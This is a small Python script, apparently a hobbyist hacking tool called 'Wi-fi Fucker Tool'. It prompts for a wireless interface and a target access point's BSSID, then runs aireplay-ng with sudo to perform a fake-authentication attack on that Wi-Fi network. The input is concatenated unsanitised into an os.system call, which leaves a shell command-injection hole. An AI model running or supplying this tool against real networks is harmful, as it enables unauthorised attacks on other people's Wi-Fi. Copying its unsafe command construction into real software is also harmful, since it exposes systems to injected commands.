import os
import sys
import time
print("""

    ███████████████████████████████
    █                             █
    █═╬═════════════════════════╬═█
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░Wi-fi Fucker Tool░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░coded by arda6░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █═╬═════════════════════════╬═█
    █                             █
    ███████████████████████████████


""")

pla = sys.platform
if pla == "win32":
    win = "Windows"
    print("     [!] Your Platform is " +win+ "\n")
elif pla == "darwin":
    mac = "MacOs"
    print("     [+] Your Platform is " +mac+ "\n")
elif pla == "linux":
    mac = "Linux"
    print("     [+] Your Platform is " +mac+"\n")
if pla == "win32":
    print("     [!] Not Suitable For Tool Windows \n")
    time.sleep(3)
    exit("     [#] https://www.github/arda6")

print("Select Wifi Card \n")
mon = input("root@eyll:~# ")
print("")
print("Select BSSID \n")
wifi = input("root@eyll:~# ")
os.system("sudo aireplay-ng -1 0 -a " +wifi+ " " +mon+"mon")
